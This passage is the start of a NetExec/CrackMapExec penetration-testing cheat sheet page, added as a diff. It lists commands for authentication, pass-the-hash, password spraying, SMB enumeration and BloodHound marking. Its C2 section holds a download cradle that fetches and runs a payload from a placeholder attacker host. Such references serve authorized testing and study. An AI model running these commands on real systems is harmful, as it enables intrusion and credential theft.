@@ -1,0 +1,1047 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>NetExec / CrackMapExec — Corey Clay</title>
+<meta name="description" content="NetExec (nxc) and CrackMapExec reference — SMB, LDAP, WinRM, MSSQL, SSH, FTP, RDP, WMI, NFS and VNC auth, enumeration, spraying, dumping, and lateral-movement modules.">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:ital,wght@0,400;0,500;0,600;0,700;0,800;1,400&display=swap" rel="stylesheet">
+<style>
+  :root{
+    --ink:#000000;--ink-2:#121318;--panel:#15171c;--panel-2:#191c22;
+    --line:#262a33;--line-soft:#1b1e24;
+    --fg:#e8eaed;--fg-dim:#b2b6bd;--muted:#868c98;--muted-2:#5f6672;
+    --signal:#9fef00;--signal-soft:rgba(159,239,0,.14);--signal-line:rgba(159,239,0,.34);
+    --green:#7fae7a;--red:#d17a6e;--blue:#7fa6c9;
+    --f-display:"JetBrains Mono",ui-monospace,"SF Mono",Menlo,monospace;
+    --f-body:"JetBrains Mono",ui-monospace,"SF Mono",Menlo,monospace;
+    --f-mono:"JetBrains Mono",ui-monospace,"SF Mono",Menlo,monospace;
+    box-sizing:border-box;padding-top:env(safe-area-inset-top,0px);padding-bottom:env(safe-area-inset-bottom,0px);
+  }
+  *,*::before,*::after{box-sizing:border-box}
+  html{scroll-behavior:smooth;scroll-padding-top:calc(126px + env(safe-area-inset-top,0px))}
+  @media (prefers-reduced-motion:reduce){html{scroll-behavior:auto}}
+  body{margin:0;background:var(--ink);color:var(--fg);font-family:var(--f-body);font-size:15px;line-height:1.7;
+    -webkit-font-smoothing:antialiased;text-rendering:optimizeLegibility;}
+  .grid-fade{position:fixed;inset:0;pointer-events:none;z-index:0;background-color:var(--ink);background-image:linear-gradient(180deg,transparent 0%,var(--ink) 46%),linear-gradient(var(--line-soft) 1px,transparent 1px),linear-gradient(90deg,var(--line-soft) 1px,transparent 1px),radial-gradient(1100px 520px at 82% -8%,rgba(159,239,0,.05),transparent 60%);background-size:auto,64px 64px,64px 64px,auto;background-position:0 0,-1px -1px,-1px -1px,0 0}
+  a{color:inherit;text-decoration:none}
+  ::selection{background:var(--signal-soft);color:var(--fg)}
+  .wrap{max-width:900px;margin:0 auto;padding:0 24px;position:relative;z-index:1}
+
+  header.site{position:sticky;top:0;z-index:50;background:rgba(23,25,31,.97);
+    border-bottom:1px solid var(--line-soft);padding-top:env(safe-area-inset-top,0px)}
+  .bar{display:flex;align-items:center;justify-content:space-between;height:64px;max-width:900px;margin:0 auto;padding:0 24px}
+  .brand{display:flex;align-items:center;gap:11px;font-family:var(--f-mono);font-size:14px;letter-spacing:.02em}
+  .brand .dot{width:9px;height:9px;border-radius:50%;background:var(--signal);box-shadow:0 0 0 3px var(--signal-soft);flex:none}
+  .brand b{color:var(--fg);font-weight:700}
+  .brand span{color:var(--muted)}
+  nav.top{display:flex;gap:24px;font-family:var(--f-mono);font-size:13px;color:var(--muted)}
+  nav.top a{transition:color .18s ease}
+  nav.top a:hover,nav.top a.here{color:var(--signal)}
+  nav.top a:focus-visible,.brand:focus-visible{outline:2px solid var(--signal);outline-offset:4px;border-radius:2px}
+  @media (max-width:680px){nav.top a:not(.here):not(.home){display:none}}
+
+  .cs-hero{padding:56px 0 22px}
+  .cs-hero .kicker{font-family:var(--f-mono);font-size:12.5px;color:var(--signal);margin:0 0 10px}
+  .cs-hero .kicker a{color:var(--muted)}
+  .cs-hero .kicker a:hover{color:var(--signal)}
+  .cs-hero h1{font-family:var(--f-display);font-weight:600;font-size:clamp(30px,5vw,46px);letter-spacing:-.02em;
+    line-height:1.05;margin:0 0 14px;color:var(--fg)}
+  .cs-hero p{max-width:64ch;color:var(--fg-dim);font-size:18px;margin:0}
+
+  .sec-nav{position:sticky;top:64px;z-index:40;background:rgba(23,25,31,.98);
+    border-bottom:1px solid var(--line-soft);padding:11px 0}
+  .sec-nav .inner{display:flex;gap:7px;overflow-x:auto;scrollbar-width:none;max-width:900px;margin:0 auto;padding:0 24px}
+  .sec-nav .inner::-webkit-scrollbar{display:none}
+  .sec-nav a{font-family:var(--f-mono);font-size:11.5px;color:var(--muted);white-space:nowrap;
+    padding:5px 11px;border:1px solid var(--line);border-radius:20px;transition:.16s;flex:none}
+  .sec-nav a:hover,.sec-nav a:focus-visible{color:var(--signal);border-color:var(--signal-line)}
+  .sec-nav a.here{color:var(--signal);border-color:var(--signal-line);background:var(--signal-soft)}
+  .sec-nav a:focus-visible{outline:2px solid var(--signal);outline-offset:2px}
+
+  main{padding:12px 0 40px}
+  main h2{font-family:var(--f-display);font-weight:600;font-size:clamp(23px,3.2vw,30px);letter-spacing:-.01em;
+    color:var(--fg);margin:56px 0 8px;padding-top:20px;border-top:1px solid var(--line-soft);scroll-margin-top:130px}
+  main h2:first-of-type{border-top:0;margin-top:20px}
+  main h3{font-family:var(--f-display);font-weight:500;font-size:19px;color:var(--fg);margin:30px 0 10px}
+  main h4{font-family:var(--f-mono);font-size:14px;color:var(--signal);margin:22px 0 8px;letter-spacing:.01em}
+  main p{color:var(--fg-dim);margin:0 0 16px;max-width:74ch}
+  main strong{color:var(--fg);font-weight:600}
+  main a{color:var(--signal)}
+  main a:hover{text-decoration:underline}
+  main ul,main ol{color:var(--fg-dim);margin:0 0 18px;padding-left:22px;max-width:74ch}
+  main li{margin-bottom:6px}
+  main ul li::marker{color:var(--signal)}
+  main hr{border:0;border-top:1px solid var(--line-soft);margin:8px 0}
+
+  .code-wrap{position:relative;margin:0 0 18px}
+  main pre{background:var(--ink-2);border:1px solid var(--line);border-radius:8px;overflow-x:auto;
+    margin:0;padding:15px 17px;font-family:var(--f-mono);font-size:13px;line-height:1.7;color:var(--fg-dim)}
+  main pre code{font-family:var(--f-mono);background:none;padding:0;color:inherit;white-space:pre}
+  main :not(pre) > code{font-family:var(--f-mono);font-size:.86em;background:var(--panel-2);
+    border:1px solid var(--line-soft);border-radius:5px;padding:1px 6px;color:var(--signal)}
+  .copy{position:absolute;top:8px;right:8px;font-family:var(--f-mono);font-size:11px;color:var(--muted);
+    background:var(--panel);border:1px solid var(--line);border-radius:6px;padding:4px 10px;cursor:pointer;transition:.15s;opacity:.85}
+  .copy:hover,.copy:focus-visible{color:var(--signal);border-color:var(--signal-line);opacity:1}
+  .copy:focus-visible{outline:2px solid var(--signal);outline-offset:2px}
+  .copy.done{color:var(--green);border-color:rgba(127,174,122,.4)}
+
+  .table-scroll{overflow-x:auto;margin:0 0 20px;border:1px solid var(--line-soft);border-radius:8px}
+  main table{border-collapse:collapse;width:100%;font-size:14px;min-width:520px}
+  main th{font-family:var(--f-mono);font-size:12px;text-align:left;color:var(--signal);
+    background:var(--panel-2);padding:10px 14px;border-bottom:1px solid var(--line);font-weight:500;white-space:nowrap}
+  main td{padding:10px 14px;border-bottom:1px solid var(--line-soft);color:var(--fg-dim);vertical-align:top}
+  main tr:last-child td{border-bottom:0}
+  main td code{white-space:nowrap}
+
+  footer.site{border-top:1px solid var(--line-soft);padding:44px 0 60px;margin-top:40px}
+  .foot{display:flex;flex-wrap:wrap;justify-content:space-between;gap:20px;align-items:center}
+  .foot .f-brand{font-family:var(--f-mono);font-size:13px;color:var(--muted)}
+  .foot .f-brand b{color:var(--fg)}
+  .foot-links{display:flex;gap:22px;font-family:var(--f-mono);font-size:13px}
+  .foot-links a{color:var(--muted);transition:color .16s}
+  .foot-links a:hover,.foot-links a:focus-visible{color:var(--signal)}
+  .disclaimer{font-family:var(--f-mono);font-size:11.5px;color:var(--muted-2);margin:30px 0 0;max-width:74ch;line-height:1.7;
+    border-left:2px solid var(--line);padding-left:16px}
+
+  .hub{display:grid;grid-template-columns:repeat(2,1fr);gap:18px;margin:14px 0 10px}
+  @media (max-width:640px){.hub{grid-template-columns:1fr}}
+  .hub-card{display:block;border:1px solid var(--line);border-radius:11px;padding:24px 24px 22px;background:var(--panel);
+    transition:border-color .16s ease,transform .16s ease;position:relative}
+  .hub-card:hover{border-color:var(--signal-line);transform:translateY(-3px)}
+  .hub-card .idx{font-family:var(--f-mono);font-size:12px;color:var(--signal)}
+  .hub-card h3{font-family:var(--f-display);font-weight:600;font-size:21px;color:var(--fg);margin:8px 0 8px;letter-spacing:-.01em}
+  .hub-card p{font-family:var(--f-body);font-size:15.5px;color:var(--muted);margin:0 0 16px;line-height:1.5}
+  .hub-card .tags{display:flex;flex-wrap:wrap;gap:6px}
+  .hub-card .t{font-family:var(--f-mono);font-size:10.5px;color:var(--fg-dim);background:var(--panel-2);
+    border:1px solid var(--line-soft);padding:3px 8px;border-radius:5px}
+  .hub-card .go{position:absolute;top:22px;right:22px;font-family:var(--f-mono);font-size:16px;color:var(--muted);transition:.16s}
+  .hub-card:hover .go{color:var(--signal);transform:translateX(2px)}
+  .hub-card.soon{opacity:.6;pointer-events:none}
+  .hub-card.soon .go{content:''}
+  .hub-note{font-family:var(--f-mono);font-size:12.5px;color:var(--muted-2);margin-top:26px;border-left:2px solid var(--line);padding-left:16px}
+  .hub-empty{border:1px dashed var(--line);border-radius:12px;padding:52px 30px;text-align:center;margin:14px 0 10px}
+  .hub-empty .ico{font-family:var(--f-mono);font-size:13px;color:var(--signal);margin:0 0 12px}
+  .hub-empty h3{font-family:var(--f-display);font-weight:500;font-size:20px;color:var(--fg);margin:0 0 8px}
+  .hub-empty p{font-family:var(--f-body);font-size:15.5px;color:var(--muted);margin:0 auto;max-width:46ch;line-height:1.55}
+</style>
+</head>
+<body>
+<div class="grid-fade" aria-hidden="true"></div>
+
+<header class="site" id="top">
+  <div class="bar">
+    <a class="brand" href="index.html" aria-label="Home">
+      <span class="dot" aria-hidden="true"></span><b>corey.clay</b><span>/ tools & utilities / netexec</span>
+    </a>
+    <nav class="top" aria-label="Primary">
+      <a class="home" href="index.html">home</a>
+      <a href="index.html#log">log</a>
+      <a href="methodology.html">methodology</a>
+      <a href="enumeration.html">enumeration</a>
+      <a href="pre-exploitation.html">pre-exploitation</a>
+      <a href="exploitation.html">exploitation</a>
+      <a href="post-exploitation.html">post-exploitation</a>
+      <a class="here" href="tools-utilities.html" aria-current="page">tools &amp; utilities</a>
+      <a href="https://www.linkedin.com/in/corey-clay-664943b8/" target="_blank" rel="noopener">linkedin</a>
+    </nav>
+  </div>
+</header>
+
+<div class="cs-hero wrap">
+  <p class="kicker"><a href="tools-utilities.html">&lsaquo; tools &amp; utilities</a> &nbsp;/&nbsp; // swiss-army-of-nxc</p>
+  <h1>NetExec / CrackMapExec</h1>
+  <p>NetExec (the successor to CrackMapExec) is the Swiss-army knife for post-foothold AD work — one tool for every protocol: SMB, LDAP, WinRM, MSSQL, SSH, FTP, RDP, WMI, NFS and VNC. Covers auth, enumeration, password and hash spraying, relay-list generation, Kerberos attacks (ASREPRoast, Kerberoasting, delegation hunting), credential dumping (SAM, LSA, NTDS, LSASS modules, DPAPI, SCCM), BloodHound integration, and the full pentest workflow.</p>
+</div>
+
+<nav class="sec-nav" aria-label="Jump to section">
+  <div class="inner">
+      <a href="#core-usage-global-options">Core Usage &amp; Global Options</a>
+      <a href="#smb-protocol">SMB Protocol</a>
+      <a href="#ldap-protocol">LDAP Protocol</a>
+      <a href="#winrm-protocol">WinRM Protocol</a>
+      <a href="#mssql-protocol">MSSQL Protocol</a>
+      <a href="#ssh-protocol">SSH Protocol</a>
+      <a href="#ftp-protocol">FTP Protocol</a>
+      <a href="#rdp-protocol">RDP Protocol</a>
+      <a href="#wmi-protocol">WMI Protocol</a>
+      <a href="#nfs-protocol">NFS Protocol</a>
+      <a href="#vnc-protocol">VNC Protocol</a>
+      <a href="#proxychains-chisel-integration">Proxychains + Chisel Integration</a>
+      <a href="#quick-reference-pentest-workflow">Quick Reference — Pentest Workflow</a>
+      <a href="#references">References</a>
+  </div>
+</nav>
+
+<main class="wrap">
+<p>NetExec (nxc) is the successor to CrackMapExec (cme). All commands below use <code>nxc</code> syntax. Supported protocols: SMB, LDAP, WinRM, MSSQL, SSH, FTP, RDP, WMI, NFS, VNC.</p>
+<hr />
+<h2 id="core-usage-global-options">Core Usage &amp; Global Options</h2>
+<pre><code class="language-bash">## View all protocols
+nxc --help
+
+## View protocol-specific options
+nxc &lt;PROTOCOL&gt; --help
+
+## Threading, timeout, jitter
+nxc &lt;PROTOCOL&gt; &lt;TARGET&gt; -t &lt;THREADS&gt; --timeout &lt;SECONDS&gt; --jitter &lt;INTERVAL&gt;
+## Example: nxc smb &lt;TARGET&gt; --jitter 2-5 -u users.txt -p passwords.txt
+
+## DNS options
+nxc &lt;PROTOCOL&gt; &lt;TARGET&gt; --dns-server &lt;DNS_IP&gt;
+nxc &lt;PROTOCOL&gt; &lt;TARGET&gt; --dns-tcp           # Use TCP for DNS
+nxc &lt;PROTOCOL&gt; &lt;TARGET&gt; -6                  # Force IPv6
+
+## Logging
+nxc &lt;PROTOCOL&gt; &lt;TARGET&gt; --log output.txt    # Log current command output
+## Or set log_mode = True in ~/.nxc/nxc.conf for persistent logging
+
+## Export function (output as JSON — buggy, requires full path)
+nxc &lt;PROTOCOL&gt; &lt;TARGET&gt; [options] --export $(pwd)/output.txt
+## Format exported JSON: sed -i &quot;s/'/\&quot;/g&quot; output.txt &amp;&amp; cat output.txt | jq
+
+## Audit mode (redact creds from output)
+## Set audit_mode character in ~/.nxc/nxc.conf
+
+## Ignore OpSec warnings
+## Set ignore_opsec = True in ~/.nxc/nxc.conf
+</code></pre>
+<h3>Target Formats</h3>
+<pre><code class="language-bash">nxc &lt;PROTOCOL&gt; &lt;HOSTNAME&gt;                   # Single host
+nxc &lt;PROTOCOL&gt; &lt;IP1&gt; &lt;IP2&gt; &lt;IP3&gt;            # Multiple IPs
+nxc &lt;PROTOCOL&gt; &lt;IP&gt;/24                      # CIDR notation
+nxc &lt;PROTOCOL&gt; &lt;IP_START&gt;-&lt;IP_END&gt;          # IP range
+nxc &lt;PROTOCOL&gt; targets.txt                  # File (one target per line)
+</code></pre>
+<h3>Authentication (All Protocols)</h3>
+<pre><code class="language-bash">## Username/password
+nxc &lt;PROTOCOL&gt; &lt;TARGET&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;'
+
+## Pass-the-Hash
+nxc &lt;PROTOCOL&gt; &lt;TARGET&gt; -u &lt;USER&gt; -H '&lt;NTHASH&gt;'
+nxc &lt;PROTOCOL&gt; &lt;TARGET&gt; -u &lt;USER&gt; -H '&lt;LM:NT&gt;'
+
+## Kerberos (password-based — auto TGT)
+nxc &lt;PROTOCOL&gt; &lt;TARGET&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' -k
+
+## Kerberos (ccache ticket)
+export KRB5CCNAME=/path/to/ticket.ccache
+nxc &lt;PROTOCOL&gt; &lt;TARGET&gt; --use-kcache
+nxc &lt;PROTOCOL&gt; &lt;TARGET&gt; --use-kcache --kdcHost &lt;DC_FQDN&gt;
+
+## Certificate-based
+nxc smb &lt;TARGET&gt; --pfx-cert user.pfx -u &lt;USER&gt;
+nxc smb &lt;TARGET&gt; --pfx-cert user.pfx --pfx-pass &lt;PASS&gt; -u &lt;USER&gt;
+nxc smb &lt;TARGET&gt; --pem-cert user.pem --pem-key key.pem -u &lt;USER&gt;
+
+## Local auth (not domain)
+nxc &lt;PROTOCOL&gt; &lt;TARGET&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' --local-auth
+
+## Credentials with special chars (wrap in single quotes)
+nxc &lt;PROTOCOL&gt; &lt;TARGET&gt; -u &lt;USER&gt; -p 'P@ss!w0rd'
+
+## Credentials starting with dash
+nxc &lt;PROTOCOL&gt; &lt;TARGET&gt; -u='-username' -p='-password'
+
+## Use credential ID from database
+nxc &lt;PROTOCOL&gt; &lt;TARGET&gt; -id &lt;CRED_ID&gt;
+
+## Multi-domain auth (FILE format: DOMAIN1\user per line)
+nxc &lt;PROTOCOL&gt; &lt;TARGET&gt; -u users_with_domains.txt -p '&lt;PASS&gt;'
+</code></pre>
+<h3>Password Spraying (All Protocols)</h3>
+<pre><code class="language-bash">## Single password against user list
+nxc &lt;PROTOCOL&gt; &lt;TARGET&gt; -u users.txt -p '&lt;PASS&gt;' --continue-on-success
+
+## Multiple passwords (bruteforce matrix)
+nxc &lt;PROTOCOL&gt; &lt;TARGET&gt; -u users.txt -p passwords.txt
+
+## One-to-one mapping (user1→pass1, user2→pass2)
+nxc &lt;PROTOCOL&gt; &lt;TARGET&gt; -u users.txt -p passwords.txt --no-bruteforce --continue-on-success
+
+## Check username == password
+nxc &lt;PROTOCOL&gt; &lt;TARGET&gt; -u users.txt -p users.txt --no-bruteforce --continue-on-success
+
+## Hash spraying
+nxc &lt;PROTOCOL&gt; &lt;TARGET&gt; -u users.txt -H hashes.txt --no-bruteforce --continue-on-success
+
+## Throttle attempts (jitter in seconds)
+nxc &lt;PROTOCOL&gt; &lt;TARGET&gt; --jitter 3 -u users.txt -p passwords.txt
+nxc &lt;PROTOCOL&gt; &lt;TARGET&gt; --jitter 2-5 -u users.txt -p passwords.txt
+
+## Fail limits (prevent lockout)
+nxc &lt;PROTOCOL&gt; &lt;TARGET&gt; --gfail-limit &lt;LIMIT&gt; -u users.txt -p passwords.txt  # Global failed login limit
+nxc &lt;PROTOCOL&gt; &lt;TARGET&gt; --ufail-limit &lt;LIMIT&gt; -u users.txt -p passwords.txt  # Per-username fail limit
+nxc &lt;PROTOCOL&gt; &lt;TARGET&gt; --fail-limit &lt;LIMIT&gt; -u users.txt -p passwords.txt   # Per-host fail limit
+</code></pre>
+<blockquote>
+<p><strong>Account Status Colors:</strong> Green = valid creds, Red = invalid user/pass, Magenta = valid creds but auth failed (see status codes below).</p>
+<p><strong>STATUS codes (Magenta):</strong> <code>STATUS_ACCOUNT_DISABLED</code>, <code>STATUS_ACCOUNT_EXPIRED</code>, <code>STATUS_ACCOUNT_RESTRICTION</code>, <code>STATUS_INVALID_LOGON_HOURS</code>, <code>STATUS_INVALID_WORKSTATION</code>, <code>STATUS_LOGON_TYPE_NOT_GRANTED</code>, <code>STATUS_PASSWORD_EXPIRED</code>, <code>STATUS_PASSWORD_MUST_CHANGE</code>, <code>STATUS_ACCESS_DENIED</code>. For <code>STATUS_INVALID_LOGON_HOURS</code> / <code>STATUS_INVALID_WORKSTATION</code>, try a different time or workstation. For <code>STATUS_PASSWORD_MUST_CHANGE</code>, change the password with <code>smbpasswd</code>.</p>
+</blockquote>
+<pre><code class="language-bash">## Handle STATUS_PASSWORD_MUST_CHANGE (change password via smbpasswd)
+smbpasswd -r &lt;DC_IP&gt; -U &lt;USER&gt;
+## Enter old password, then new password twice
+
+## Monitor bad password count before spraying (requires auth)
+## Authenticated --users shows badpwdcount per user
+nxc smb &lt;TARGET&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' --users
+## Output includes: badpwdcount: N — track this to avoid lockout
+## Note: Bad password count resets when user authenticates with correct creds
+</code></pre>
+<h3>Modules</h3>
+<pre><code class="language-bash">## List available modules for a protocol
+nxc &lt;PROTOCOL&gt; -L
+
+## Use a module
+nxc &lt;PROTOCOL&gt; &lt;TARGET&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' -M &lt;MODULE&gt;
+
+## View module options
+nxc &lt;PROTOCOL&gt; -M &lt;MODULE&gt; --options
+
+## Module with options
+nxc &lt;PROTOCOL&gt; &lt;TARGET&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' -M &lt;MODULE&gt; -o KEY=value
+
+## Run multiple modules
+nxc &lt;PROTOCOL&gt; &lt;TARGET&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' -M spooler -M webdav -M lsassy
+</code></pre>
+<h3>Credential Database (nxcdb)</h3>
+<pre><code class="language-bash">nxcdb                                       # Enter database shell
+nxcdb (default) &gt; workspace create &lt;NAME&gt;   # Create workspace
+nxcdb (default) &gt; workspace &lt;NAME&gt;          # Switch workspace
+nxcdb (default) &gt; workspace list            # List workspaces
+nxcdb (default) &gt; proto smb                 # Switch to SMB database
+nxcdb (default)(smb) &gt; creds               # View stored credentials
+nxcdb (default)(smb) &gt; hosts               # View discovered hosts
+nxcdb (default)(smb) &gt; shares              # View discovered shares
+nxcdb (default)(smb) &gt; export creds csv /tmp/creds.csv
+nxcdb (default)(smb) &gt; export shares detailed shares.csv
+nxcdb (default)(smb) &gt; help export         # View all export options
+nxcdb (default)(smb) &gt; back                # Back to protocol selection
+</code></pre>
+<h3>BloodHound Integration</h3>
+<pre><code class="language-bash">## Auto-mark owned users in BloodHound (configure ~/.nxc/nxc.conf):
+## [BloodHound]
+## bh_enabled = True
+## bh_uri = 127.0.0.1
+## bh_port = 7687
+## bh_user = user
+## bh_pass = pass
+## With bh_enabled = True, any successful auth auto-marks users as owned
+## Modules like lsassy/procdump also mark found users as owned
+## Note: --ntds and --lsa do NOT auto-mark users
+
+## Mark computers as owned (users are marked auto, computers need this module)
+nxc smb &lt;TARGET&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' -M bh_owned -o PASS=&lt;NEO4J_PASS&gt;
+nxc smb &lt;TARGET&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' -M bh_owned -o URI=&lt;NEO4J_IP&gt; PORT=7687 USER=neo4j PASS=&lt;NEO4J_PASS&gt;
+
+## BloodHound data collection via LDAP
+nxc ldap &lt;DC_IP&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' --bloodhound --collection All
+nxc ldap &lt;DC_IP&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' --bloodhound --collection Method1,Method2
+</code></pre>
+<h3>C2 Framework Integration</h3>
+<pre><code class="language-bash">## Empire — get agent into PowerShell Empire (configure ~/.nxc/nxc.conf [Empire] section)
+nxc smb &lt;TARGET&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' -M empire_exec -o LISTENER=&lt;LISTENER_NAME&gt;
+
+## Metasploit — use web_delivery module
+## 1. In msfconsole: use exploit/multi/script/web_delivery → configure SRVHOST/SRVPORT/LHOST/LPORT → run -j
+## 2. Copy the URL from Metasploit output
+nxc smb &lt;TARGET&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' -M web_delivery -o URL=http://&lt;ATTACKER_IP&gt;:&lt;PORT&gt;/&lt;PATH&gt;
+nxc smb &lt;TARGET&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' -M web_delivery -o URL=http://&lt;ATTACKER_IP&gt;:&lt;PORT&gt;/&lt;PATH&gt; PAYLOAD=32  # 32-bit
+
+## Generic C2 — use PowerShell download cradle via -X
+nxc smb &lt;TARGET&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' -X &quot;IEX(New-Object Net.WebClient).DownloadString('http://&lt;ATTACKER_IP&gt;/payload.ps1')&quot; --no-output
+</code></pre>
+<hr />
+<h2 id="smb-protocol">SMB Protocol</h2>
+<h3>Host Discovery &amp; Info</h3>
+<pre><code class="language-bash">## Discover live hosts
+nxc smb &lt;NETWORK&gt;/24
+
+## Generate relay list (hosts without SMB signing)
+nxc smb &lt;NETWORK&gt;/24 --gen-relay-list relay_list.txt
+
+## Generate hosts file (for labs without DNS)
+nxc smb &lt;NETWORK&gt;/24 -u &lt;USER&gt; -p '&lt;PASS&gt;' --generate-hosts-file
+
+## Generate krb5.conf
+nxc smb &lt;TARGET&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' --generate-krb5-file /path/krb5.conf
+
+## Generate TGT
+nxc smb &lt;TARGET&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' --generate-tgt /path/ticket.ccache
+</code></pre>
+<h3>SMB Authentication</h3>
+<pre><code class="language-bash">## Domain auth
+nxc smb &lt;TARGET&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;'
+nxc smb &lt;TARGET&gt; -u &lt;USER&gt; -H '&lt;NTHASH&gt;'
+
+## Local auth
+nxc smb &lt;TARGET&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' --local-auth
+
+## Null session
+nxc smb &lt;TARGET&gt; -u '' -p ''
+
+## Guest logon check
+nxc smb &lt;TARGET&gt; -u 'randomuser' -p ''
+
+## RBCD delegation abuse
+nxc smb &lt;TARGET&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' --delegate Administrator
+
+## S4U2Self abuse (with computer account)
+nxc smb &lt;TARGET&gt; -u '&lt;MACHINE&gt;$' -H '&lt;HASH&gt;' --delegate Administrator --self
+
+## LAPS password retrieval
+nxc smb &lt;TARGET&gt; -u &lt;LAPS_READER&gt; -p '&lt;PASS&gt;' --laps
+nxc smb &lt;TARGET&gt; -u &lt;LAPS_READER&gt; -p '&lt;PASS&gt;' --laps &lt;ADMIN_NAME&gt;  # Non-default admin name
+</code></pre>
+<h3>SMB Enumeration</h3>
+<pre><code class="language-bash">## Shares (NULL session / guest)
+nxc smb &lt;TARGET&gt; -u '' -p '' --shares              # NULL session
+nxc smb &lt;TARGET&gt; -u 'guest' -p '' --shares          # Guest fallback (if NULL denied)
+
+## Shares (authenticated)
+nxc smb &lt;TARGET&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' --shares
+nxc smb &lt;TARGET&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' --shares READ           # Only readable
+nxc smb &lt;TARGET&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' --shares WRITE          # Only writable
+nxc smb &lt;TARGET&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' --shares READ,WRITE     # Both
+
+## Users and groups
+nxc smb &lt;TARGET&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' --users
+nxc smb &lt;TARGET&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' --users-export users.txt
+nxc smb &lt;TARGET&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' --rid-brute              # RID bruteforce
+nxc smb &lt;TARGET&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' --local-group            # Local groups
+
+## Sessions and logged-on users (requires admin)
+nxc smb &lt;TARGET&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' --loggedon-users
+nxc smb &lt;TARGET&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' --loggedon-users &lt;HUNT_USER&gt;
+nxc smb &lt;TARGET&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' --loggedon-users --loggedon-users-filter '&lt;REGEX&gt;'  # Filter with regex
+nxc smb &lt;TARGET&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' --qwinsta               # Windows sessions
+nxc smb &lt;TARGET&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' --qwinsta &lt;HUNT_USER&gt;
+nxc smb &lt;TARGET&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' --reg-sessions           # Registry sessions
+nxc smb &lt;TARGET&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' --reg-sessions '&lt;HUNT_USER&gt;'
+
+## Computers (LDAP query via SMB)
+nxc smb &lt;TARGET&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' --computers
+
+## Policy
+nxc smb &lt;TARGET&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' --pass-pol              # Password policy
+nxc smb &lt;TARGET&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' --disks                 # Enumerate disks
+
+## WMI queries (requires admin typically)
+nxc smb &lt;TARGET&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' --wmi &quot;&lt;WQL_QUERY&gt;&quot;
+nxc smb &lt;TARGET&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' --wmi &quot;&lt;WQL_QUERY&gt;&quot; --wmi-namespace &quot;&lt;NAMESPACE&gt;&quot;
+## Default namespace: root\cimv2
+## Example: check if Sysmon is running
+nxc smb &lt;TARGET&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' --wmi &quot;SELECT Caption,ProcessId FROM Win32_Process WHERE Caption LIKE '%sysmon%'&quot;
+## Example: query different namespace (root\WMI)
+nxc smb &lt;TARGET&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' --wmi &quot;SELECT * FROM MSPower_DeviceEnable&quot; --wmi-namespace &quot;root\WMI&quot;
+
+## Network interfaces (requires admin)
+nxc smb &lt;TARGET&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' --interfaces
+
+## Processes (requires admin)
+nxc smb &lt;TARGET&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' --tasklist
+nxc smb &lt;TARGET&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' --tasklist keepass.exe   # Specific process
+nxc smb &lt;TARGET&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' --taskkill &lt;PID&gt;         # Kill process
+nxc smb &lt;TARGET&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' --taskkill process.exe
+
+## AV/EDR detection (no admin needed)
+nxc smb &lt;TARGET&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' -M enum_av
+
+## NTLMv1 check (requires admin)
+nxc smb &lt;TARGET&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' -M ntlmv1
+
+## BitLocker status
+nxc smb &lt;TARGET&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' -M bitlocker
+
+## Lockscreen backdoor detection (requires admin)
+nxc smb &lt;TARGET&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' -M lockscreendoors
+
+## SCCM enumeration via registry (requires admin)
+nxc smb &lt;TARGET&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;' -M sccm-recon6
+</code></pre>
+<h3>SMB Vulnerability Scanning</h3>
+<pre><code class="language-bash">## Individual checks
